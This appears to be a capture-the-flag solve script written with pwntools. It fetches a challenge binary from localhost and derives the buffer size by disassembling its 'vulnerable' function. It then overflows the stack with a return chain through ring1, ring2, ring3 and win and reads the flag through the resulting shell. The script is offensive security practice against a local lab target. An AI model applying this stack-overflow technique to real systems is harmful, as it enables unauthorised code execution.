from pwn import *

r = remote("localhost", 1024)

bin = eval(r.recvline()[:-4])
open("./out", "wb").write(bin)

p = ELF("./out")

sz = int(p.disasm(p.symbols["vulnerable"], 20).split("sub    rsp, ")[1].split('\n')[0], 16)+8

log.info(f"Guessing padding size to {sz}")

padding = sz
exploit = b"A"*padding
exploit += p64(p.symbols["ring1"])
exploit += p64(p.symbols["ring2"])
exploit += p64(p.symbols["ring3"])
exploit += p64(p.symbols["win"])

open("exploit", "wb").write(exploit)

r.sendline(exploit)
r.sendline("cat flag")
r.interactive()